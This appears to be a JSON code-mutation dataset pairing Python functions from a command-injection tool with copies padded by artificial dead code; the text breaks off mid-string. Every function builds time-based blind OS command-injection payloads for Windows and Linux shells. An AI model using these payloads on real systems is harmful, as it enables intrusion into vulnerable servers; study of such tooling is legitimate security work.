[
    {
        "func_name": "decision",
        "original": "def decision(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + \"'\" + TAG + \"'\" + pipe + 'for /f \"tokens=*\" %i in (\\'cmd /c \"powershell.exe -InputFormat none ((Get-Content ' + OUTPUT_TEXTFILE + ').length)\"\\')' + settings.SINGLE_WHITESPACE + 'do if %i==' + str(j) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + \"'\" + TAG + \"'\" + ampersand + 'for /f \"tokens=*\" %i in (\\' cmd /c \"powershell.exe -InputFormat none ((Get-Content ' + OUTPUT_TEXTFILE + ').length)\"\\')' + settings.SINGLE_WHITESPACE + 'do if %i==' + str(j) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n    elif separator == ';' or separator == '%0a':\n        payload = separator + 'str=$(echo ' + TAG + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + ')' + separator + 'str=$(cat ' + OUTPUT_TEXTFILE + ')' + separator + 'str1=$(expr length \"$str\")' + separator + 'if [ ' + str(j) + ' -ne ${str1} ]' + separator + 'then sleep 0' + separator + 'else sleep ' + str(timesec) + separator + 'fi '\n    elif separator == '&&':\n        separator = _urllib.parse.quote(separator)\n        ampersand = _urllib.parse.quote('&')\n        payload = ampersand + 'sleep 0' + separator + 'str=$(echo ' + TAG + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + ')' + separator + 'str=$(cat ' + OUTPUT_TEXTFILE + ')' + separator + 'str1=$(expr length \"$str\")' + separator + '[ ' + str(j) + ' -eq ${str1} ] ' + separator + 'sleep ' + str(timesec)\n        separator = _urllib.parse.unquote(separator)\n    elif separator == '||':\n        pipe = '|'\n        payload = pipe + 'echo ' + TAG + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + pipe + '[ ' + str(j) + ' -ne $(cat ' + OUTPUT_TEXTFILE + pipe + \"tr -d '\\\\n'\" + pipe + 'wc -c) ] ' + separator + 'sleep ' + str(timesec)\n    else:\n        pass\n    return payload",
        "mutated": [
            "def decision(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):\n    if False:\n        i = 10\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + \"'\" + TAG + \"'\" + pipe + 'for /f \"tokens=*\" %i in (\\'cmd /c \"powershell.exe -InputFormat none ((Get-Content ' + OUTPUT_TEXTFILE + ').length)\"\\')' + settings.SINGLE_WHITESPACE + 'do if %i==' + str(j) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + \"'\" + TAG + \"'\" + ampersand + 'for /f \"tokens=*\" %i in (\\' cmd /c \"powershell.exe -InputFormat none ((Get-Content ' + OUTPUT_TEXTFILE + ').length)\"\\')' + settings.SINGLE_WHITESPACE + 'do if %i==' + str(j) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n    elif separator == ';' or separator == '%0a':\n        payload = separator + 'str=$(echo ' + TAG + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + ')' + separator + 'str=$(cat ' + OUTPUT_TEXTFILE + ')' + separator + 'str1=$(expr length \"$str\")' + separator + 'if [ ' + str(j) + ' -ne ${str1} ]' + separator + 'then sleep 0' + separator + 'else sleep ' + str(timesec) + separator + 'fi '\n    elif separator == '&&':\n        separator = _urllib.parse.quote(separator)\n        ampersand = _urllib.parse.quote('&')\n        payload = ampersand + 'sleep 0' + separator + 'str=$(echo ' + TAG + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + ')' + separator + 'str=$(cat ' + OUTPUT_TEXTFILE + ')' + separator + 'str1=$(expr length \"$str\")' + separator + '[ ' + str(j) + ' -eq ${str1} ] ' + separator + 'sleep ' + str(timesec)\n        separator = _urllib.parse.unquote(separator)\n    elif separator == '||':\n        pipe = '|'\n        payload = pipe + 'echo ' + TAG + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + pipe + '[ ' + str(j) + ' -ne $(cat ' + OUTPUT_TEXTFILE + pipe + \"tr -d '\\\\n'\" + pipe + 'wc -c) ] ' + separator + 'sleep ' + str(timesec)\n    else:\n        pass\n    return payload",
            "def decision(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + \"'\" + TAG + \"'\" + pipe + 'for /f \"tokens=*\" %i in (\\'cmd /c \"powershell.exe -InputFormat none ((Get-Content ' + OUTPUT_TEXTFILE + ').length)\"\\')' + settings.SINGLE_WHITESPACE + 'do if %i==' + str(j) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + \"'\" + TAG + \"'\" + ampersand + 'for /f \"tokens=*\" %i in (\\' cmd /c \"powershell.exe -InputFormat none ((Get-Content ' + OUTPUT_TEXTFILE + ').length)\"\\')' + settings.SINGLE_WHITESPACE + 'do if %i==' + str(j) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n    elif separator == ';' or separator == '%0a':\n        payload = separator + 'str=$(echo ' + TAG + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + ')' + separator + 'str=$(cat ' + OUTPUT_TEXTFILE + ')' + separator + 'str1=$(expr length \"$str\")' + separator + 'if [ ' + str(j) + ' -ne ${str1} ]' + separator + 'then sleep 0' + separator + 'else sleep ' + str(timesec) + separator + 'fi '\n    elif separator == '&&':\n        separator = _urllib.parse.quote(separator)\n        ampersand = _urllib.parse.quote('&')\n        payload = ampersand + 'sleep 0' + separator + 'str=$(echo ' + TAG + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + ')' + separator + 'str=$(cat ' + OUTPUT_TEXTFILE + ')' + separator + 'str1=$(expr length \"$str\")' + separator + '[ ' + str(j) + ' -eq ${str1} ] ' + separator + 'sleep ' + str(timesec)\n        separator = _urllib.parse.unquote(separator)\n    elif separator == '||':\n        pipe = '|'\n        payload = pipe + 'echo ' + TAG + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + pipe + '[ ' + str(j) + ' -ne $(cat ' + OUTPUT_TEXTFILE + pipe + \"tr -d '\\\\n'\" + pipe + 'wc -c) ] ' + separator + 'sleep ' + str(timesec)\n    else:\n        pass\n    return payload",
            "def decision(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + \"'\" + TAG + \"'\" + pipe + 'for /f \"tokens=*\" %i in (\\'cmd /c \"powershell.exe -InputFormat none ((Get-Content ' + OUTPUT_TEXTFILE + ').length)\"\\')' + settings.SINGLE_WHITESPACE + 'do if %i==' + str(j) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + \"'\" + TAG + \"'\" + ampersand + 'for /f \"tokens=*\" %i in (\\' cmd /c \"powershell.exe -InputFormat none ((Get-Content ' + OUTPUT_TEXTFILE + ').length)\"\\')' + settings.SINGLE_WHITESPACE + 'do if %i==' + str(j) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n    elif separator == ';' or separator == '%0a':\n        payload = separator + 'str=$(echo ' + TAG + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + ')' + separator + 'str=$(cat ' + OUTPUT_TEXTFILE + ')' + separator + 'str1=$(expr length \"$str\")' + separator + 'if [ ' + str(j) + ' -ne ${str1} ]' + separator + 'then sleep 0' + separator + 'else sleep ' + str(timesec) + separator + 'fi '\n    elif separator == '&&':\n        separator = _urllib.parse.quote(separator)\n        ampersand = _urllib.parse.quote('&')\n        payload = ampersand + 'sleep 0' + separator + 'str=$(echo ' + TAG + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + ')' + separator + 'str=$(cat ' + OUTPUT_TEXTFILE + ')' + separator + 'str1=$(expr length \"$str\")' + separator + '[ ' + str(j) + ' -eq ${str1} ] ' + separator + 'sleep ' + str(timesec)\n        separator = _urllib.parse.unquote(separator)\n    elif separator == '||':\n        pipe = '|'\n        payload = pipe + 'echo ' + TAG + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + pipe + '[ ' + str(j) + ' -ne $(cat ' + OUTPUT_TEXTFILE + pipe + \"tr -d '\\\\n'\" + pipe + 'wc -c) ] ' + separator + 'sleep ' + str(timesec)\n    else:\n        pass\n    return payload",
            "def decision(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + \"'\" + TAG + \"'\" + pipe + 'for /f \"tokens=*\" %i in (\\'cmd /c \"powershell.exe -InputFormat none ((Get-Content ' + OUTPUT_TEXTFILE + ').length)\"\\')' + settings.SINGLE_WHITESPACE + 'do if %i==' + str(j) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + \"'\" + TAG + \"'\" + ampersand + 'for /f \"tokens=*\" %i in (\\' cmd /c \"powershell.exe -InputFormat none ((Get-Content ' + OUTPUT_TEXTFILE + ').length)\"\\')' + settings.SINGLE_WHITESPACE + 'do if %i==' + str(j) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n    elif separator == ';' or separator == '%0a':\n        payload = separator + 'str=$(echo ' + TAG + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + ')' + separator + 'str=$(cat ' + OUTPUT_TEXTFILE + ')' + separator + 'str1=$(expr length \"$str\")' + separator + 'if [ ' + str(j) + ' -ne ${str1} ]' + separator + 'then sleep 0' + separator + 'else sleep ' + str(timesec) + separator + 'fi '\n    elif separator == '&&':\n        separator = _urllib.parse.quote(separator)\n        ampersand = _urllib.parse.quote('&')\n        payload = ampersand + 'sleep 0' + separator + 'str=$(echo ' + TAG + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + ')' + separator + 'str=$(cat ' + OUTPUT_TEXTFILE + ')' + separator + 'str1=$(expr length \"$str\")' + separator + '[ ' + str(j) + ' -eq ${str1} ] ' + separator + 'sleep ' + str(timesec)\n        separator = _urllib.parse.unquote(separator)\n    elif separator == '||':\n        pipe = '|'\n        payload = pipe + 'echo ' + TAG + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + pipe + '[ ' + str(j) + ' -ne $(cat ' + OUTPUT_TEXTFILE + pipe + \"tr -d '\\\\n'\" + pipe + 'wc -c) ] ' + separator + 'sleep ' + str(timesec)\n    else:\n        pass\n    return payload",
            "def decision(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + \"'\" + TAG + \"'\" + pipe + 'for /f \"tokens=*\" %i in (\\'cmd /c \"powershell.exe -InputFormat none ((Get-Content ' + OUTPUT_TEXTFILE + ').length)\"\\')' + settings.SINGLE_WHITESPACE + 'do if %i==' + str(j) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + \"'\" + TAG + \"'\" + ampersand + 'for /f \"tokens=*\" %i in (\\' cmd /c \"powershell.exe -InputFormat none ((Get-Content ' + OUTPUT_TEXTFILE + ').length)\"\\')' + settings.SINGLE_WHITESPACE + 'do if %i==' + str(j) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n    elif separator == ';' or separator == '%0a':\n        payload = separator + 'str=$(echo ' + TAG + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + ')' + separator + 'str=$(cat ' + OUTPUT_TEXTFILE + ')' + separator + 'str1=$(expr length \"$str\")' + separator + 'if [ ' + str(j) + ' -ne ${str1} ]' + separator + 'then sleep 0' + separator + 'else sleep ' + str(timesec) + separator + 'fi '\n    elif separator == '&&':\n        separator = _urllib.parse.quote(separator)\n        ampersand = _urllib.parse.quote('&')\n        payload = ampersand + 'sleep 0' + separator + 'str=$(echo ' + TAG + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + ')' + separator + 'str=$(cat ' + OUTPUT_TEXTFILE + ')' + separator + 'str1=$(expr length \"$str\")' + separator + '[ ' + str(j) + ' -eq ${str1} ] ' + separator + 'sleep ' + str(timesec)\n        separator = _urllib.parse.unquote(separator)\n    elif separator == '||':\n        pipe = '|'\n        payload = pipe + 'echo ' + TAG + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + pipe + '[ ' + str(j) + ' -ne $(cat ' + OUTPUT_TEXTFILE + pipe + \"tr -d '\\\\n'\" + pipe + 'wc -c) ] ' + separator + 'sleep ' + str(timesec)\n    else:\n        pass\n    return payload"
        ]
    },
    {
        "func_name": "decision_alter_shell",
        "original": "def decision_alter_shell(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        python_payload = settings.WIN_PYTHON_INTERPRETER + ' -c \"with open(r\\'' + OUTPUT_TEXTFILE + '\\') as file: print(len(file.read().strip()))\"'\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + \"'\" + TAG + \"'\" + pipe + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(j) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + \"'\" + TAG + \"'\" + ampersand + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(j) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n    else:\n        if separator == ';' or separator == '%0a':\n            payload = separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"f = open(\\'' + OUTPUT_TEXTFILE + \"', 'w')\\nf.write('\" + TAG + '\\')\\nf.close()\\n\")' + separator + 'str1=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + '\\') as file: print(len(file.readline()))\")' + separator + 'if [ ' + str(j) + ' -ne ${str1} ]' + separator + 'then $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + separator + 'else $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")' + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"f = open(\\'' + OUTPUT_TEXTFILE + \"', 'w')\\nf.write('\" + TAG + '\\')\\nf.close()\\n\")' + separator + 'str1=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + '\\') as file: print(len(file.readline()))\") ' + separator + '[ ' + str(j) + ' -eq ${str1} ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\") '\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            payload = pipe + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"f = open(\\'' + OUTPUT_TEXTFILE + \"', 'w')\\nf.write('\" + TAG + '\\')\\nf.close()\\n\")' + settings.SINGLE_WHITESPACE + '[ ' + str(j) + ' -ne $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + '\\') as file: print(len(file.readline()))\") ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + pipe + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\") '\n        else:\n            pass\n        if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True or settings.HOST_INJECTION == True or (settings.CUSTOM_HEADER_INJECTION == True):\n            payload = payload.replace('\\n', ';')\n        elif settings.TARGET_OS != settings.OS.WINDOWS:\n            payload = payload.replace('\\n', '%0d')\n    return payload",
        "mutated": [
            "def decision_alter_shell(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):\n    if False:\n        i = 10\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        python_payload = settings.WIN_PYTHON_INTERPRETER + ' -c \"with open(r\\'' + OUTPUT_TEXTFILE + '\\') as file: print(len(file.read().strip()))\"'\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + \"'\" + TAG + \"'\" + pipe + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(j) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + \"'\" + TAG + \"'\" + ampersand + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(j) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n    else:\n        if separator == ';' or separator == '%0a':\n            payload = separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"f = open(\\'' + OUTPUT_TEXTFILE + \"', 'w')\\nf.write('\" + TAG + '\\')\\nf.close()\\n\")' + separator + 'str1=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + '\\') as file: print(len(file.readline()))\")' + separator + 'if [ ' + str(j) + ' -ne ${str1} ]' + separator + 'then $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + separator + 'else $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")' + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"f = open(\\'' + OUTPUT_TEXTFILE + \"', 'w')\\nf.write('\" + TAG + '\\')\\nf.close()\\n\")' + separator + 'str1=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + '\\') as file: print(len(file.readline()))\") ' + separator + '[ ' + str(j) + ' -eq ${str1} ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\") '\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            payload = pipe + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"f = open(\\'' + OUTPUT_TEXTFILE + \"', 'w')\\nf.write('\" + TAG + '\\')\\nf.close()\\n\")' + settings.SINGLE_WHITESPACE + '[ ' + str(j) + ' -ne $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + '\\') as file: print(len(file.readline()))\") ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + pipe + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\") '\n        else:\n            pass\n        if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True or settings.HOST_INJECTION == True or (settings.CUSTOM_HEADER_INJECTION == True):\n            payload = payload.replace('\\n', ';')\n        elif settings.TARGET_OS != settings.OS.WINDOWS:\n            payload = payload.replace('\\n', '%0d')\n    return payload",
            "def decision_alter_shell(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        python_payload = settings.WIN_PYTHON_INTERPRETER + ' -c \"with open(r\\'' + OUTPUT_TEXTFILE + '\\') as file: print(len(file.read().strip()))\"'\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + \"'\" + TAG + \"'\" + pipe + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(j) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + \"'\" + TAG + \"'\" + ampersand + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(j) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n    else:\n        if separator == ';' or separator == '%0a':\n            payload = separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"f = open(\\'' + OUTPUT_TEXTFILE + \"', 'w')\\nf.write('\" + TAG + '\\')\\nf.close()\\n\")' + separator + 'str1=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + '\\') as file: print(len(file.readline()))\")' + separator + 'if [ ' + str(j) + ' -ne ${str1} ]' + separator + 'then $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + separator + 'else $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")' + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"f = open(\\'' + OUTPUT_TEXTFILE + \"', 'w')\\nf.write('\" + TAG + '\\')\\nf.close()\\n\")' + separator + 'str1=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + '\\') as file: print(len(file.readline()))\") ' + separator + '[ ' + str(j) + ' -eq ${str1} ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\") '\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            payload = pipe + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"f = open(\\'' + OUTPUT_TEXTFILE + \"', 'w')\\nf.write('\" + TAG + '\\')\\nf.close()\\n\")' + settings.SINGLE_WHITESPACE + '[ ' + str(j) + ' -ne $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + '\\') as file: print(len(file.readline()))\") ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + pipe + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\") '\n        else:\n            pass\n        if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True or settings.HOST_INJECTION == True or (settings.CUSTOM_HEADER_INJECTION == True):\n            payload = payload.replace('\\n', ';')\n        elif settings.TARGET_OS != settings.OS.WINDOWS:\n            payload = payload.replace('\\n', '%0d')\n    return payload",
            "def decision_alter_shell(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        python_payload = settings.WIN_PYTHON_INTERPRETER + ' -c \"with open(r\\'' + OUTPUT_TEXTFILE + '\\') as file: print(len(file.read().strip()))\"'\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + \"'\" + TAG + \"'\" + pipe + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(j) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n        elif separator == '&&':\n            separator = 